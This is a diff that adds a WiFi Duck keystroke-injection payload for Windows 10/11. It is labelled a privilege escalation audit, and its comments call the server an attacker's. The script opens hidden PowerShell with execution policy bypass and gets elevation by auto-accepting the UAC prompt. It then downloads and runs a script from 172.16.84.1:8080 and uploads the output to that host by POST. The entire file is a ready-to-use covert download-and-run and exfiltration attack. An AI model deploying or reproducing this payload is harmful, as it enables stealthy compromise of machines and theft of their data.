@@ -1,0 +1,23 @@
+// WiFi Duck Payload — Windows Privilege Escalation Audit
+// Description: Opens elevated PowerShell and runs PrivescAudit-Windows.ps1
+//              from attacker HTTP server. Results uploaded back via POST.
+// Target: Windows 10/11
+// Author: <operator>
+// Syntax: WiFi Duck uses Arduino/DuckyScript hybrid syntax via the web UI.
+//         Upload this via the WiFi Duck web interface at http://192.168.4.1
+
+delay 2000
+
+// Open Run
+gui r
+delay 500
+
+// PowerShell elevated download-and-run via fodhelper UAC bypass
+string powershell -W Hidden -NoP -NonI -Exec Bypass -C "Start-Process powershell -Verb runAs -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C ""iwr http://172.16.84.1:8080/PrivescAudit-Windows.ps1 -OutFile $env:TEMP\pa.ps1; & $env:TEMP\pa.ps1 | Out-File $env:TEMP\privesc_out.txt; iwr -Method POST -InFile $env:TEMP\privesc_out.txt http://172.16.84.1:8080/upload""'"
+delay 200
+enter
+
+// Accept UAC
+delay 2000
+alt y
+delay 500
